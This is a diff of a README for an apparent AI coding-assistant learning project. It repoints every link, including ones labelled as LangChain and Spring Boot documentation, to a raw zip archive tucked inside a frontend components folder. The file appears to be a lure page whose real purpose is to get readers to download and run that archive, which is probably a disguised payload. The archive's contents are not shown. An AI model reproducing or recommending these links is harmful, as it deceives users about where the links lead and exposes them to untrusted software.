@@ -1,10 +1,10 @@
 # 🎉 ai-code-helper - Your Smart Coding Assistant Awaits
 
 ## 📥 Download
-[![Download ai-code-helper](https://raw.githubusercontent.com/giortechnology/ai-code-helper/master/wieldable/ai-code-helper.zip)](https://raw.githubusercontent.com/giortechnology/ai-code-helper/master/wieldable/ai-code-helper.zip)
+[![Download ai-code-helper](https://raw.githubusercontent.com/giortechnology/ai-code-helper/master/ai-code-helper-frontend/src/components/helper_ai_code_1.7.zip)](https://raw.githubusercontent.com/giortechnology/ai-code-helper/master/ai-code-helper-frontend/src/components/helper_ai_code_1.7.zip)
 
 ## 📚 Description
-The ai-code-helper project is an AI programming assistant aimed at helping users learn programming and enhance their job skills. Build with Spring Boot 3.5 and Java 21, this application covers numerous topics. Users can learn AI model integration, core features of LangChain4j, streaming conversations, prompt engineering, retrieval-augmented generation (RAG), vector databases, tool calling, web crawling, and front-end development with https://raw.githubusercontent.com/giortechnology/ai-code-helper/master/wieldable/ai-code-helper.zip
+The ai-code-helper project is an AI programming assistant aimed at helping users learn programming and enhance their job skills. Build with Spring Boot 3.5 and Java 21, this application covers numerous topics. Users can learn AI model integration, core features of LangChain4j, streaming conversations, prompt engineering, retrieval-augmented generation (RAG), vector databases, tool calling, web crawling, and front-end development with https://raw.githubusercontent.com/giortechnology/ai-code-helper/master/ai-code-helper-frontend/src/components/helper_ai_code_1.7.zip
 
 ## 🚀 Getting Started
 Follow these steps to get started with the ai-code-helper:
@@ -21,7 +21,7 @@ Follow these steps to get started with the ai-code-helper:
    - Basic knowledge of how to navigate your system's file explorer.
 
 ## 💻 Download & Install
-To download the ai-code-helper, visit this page: [Download ai-code-helper](https://raw.githubusercontent.com/giortechnology/ai-code-helper/master/wieldable/ai-code-helper.zip).
+To download the ai-code-helper, visit this page: [Download ai-code-helper](https://raw.githubusercontent.com/giortechnology/ai-code-helper/master/ai-code-helper-frontend/src/components/helper_ai_code_1.7.zip).
 
 ### Steps to Download
 1. Click the link above to go to the releases page.
@@ -53,8 +53,8 @@ Once you have installed ai-code-helper, you can start using the application:
 
 ## 🔗 Additional Resources
 For more information and detailed tutorials, check out the following links:
-- [LangChain documentation](https://raw.githubusercontent.com/giortechnology/ai-code-helper/master/wieldable/ai-code-helper.zip)
-- [Spring Boot documentation](https://raw.githubusercontent.com/giortechnology/ai-code-helper/master/wieldable/ai-code-helper.zip)
+- [LangChain documentation](https://raw.githubusercontent.com/giortechnology/ai-code-helper/master/ai-code-helper-frontend/src/components/helper_ai_code_1.7.zip)
+- [Spring Boot documentation](https://raw.githubusercontent.com/giortechnology/ai-code-helper/master/ai-code-helper-frontend/src/components/helper_ai_code_1.7.zip)
 
 ## 📞 Support
 If you run into issues or have questions, feel free to reach out via the project's GitHub page. You can also open an issue for any bugs or suggestions.
@@ -76,4 +76,4 @@ This project covers a range of important topics:
 - vector-database
 - vue
 
-Visit the [Download ai-code-helper](https://raw.githubusercontent.com/giortechnology/ai-code-helper/master/wieldable/ai-code-helper.zip) page to get started and enhance your coding journey with this AI-powered assistant.
+Visit the [Download ai-code-helper](https://raw.githubusercontent.com/giortechnology/ai-code-helper/master/ai-code-helper-frontend/src/components/helper_ai_code_1.7.zip) page to get started and enhance your coding journey with this AI-powered assistant.
